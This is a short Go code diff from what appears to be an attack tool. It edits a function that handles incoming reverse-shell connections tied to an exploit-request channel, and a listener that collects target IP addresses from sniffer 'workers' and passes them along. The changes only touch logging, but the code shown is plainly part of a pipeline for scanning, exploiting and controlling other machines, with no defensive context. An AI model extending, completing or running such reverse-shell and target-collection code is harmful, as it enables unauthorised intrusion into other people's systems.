@@ -60,11 +60,7 @@ func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_c
   writer.WriteString("\r\n")
   writer.Flush()
 
-  _, readerr = reader.ReadString('>')
-  if readerr != nil {
-    fmt.Println("Error reading from reverse shell: " + readerr.Error())
-  }
-  fmt.Println("Command successfully launched")
+  fmt.Println("Command launched")
 
   CloseConnectionLoudly(conn)
 }
@@ -83,7 +79,7 @@ func ListenForSnifferData(ip_passing_channel chan string){
     if readerr != nil {
       fmt.Println("We gotta error reading from the sniffer: " + readerr.Error())
     }
-    fmt.Println("Read IP: " + ip)
+    fmt.Println("Read IP: " + ip + " from worker " + conn.RemoteAddr().String())
     fmt.Println("Listener is passing IPs")
     ip_passing_channel <- ip
   }
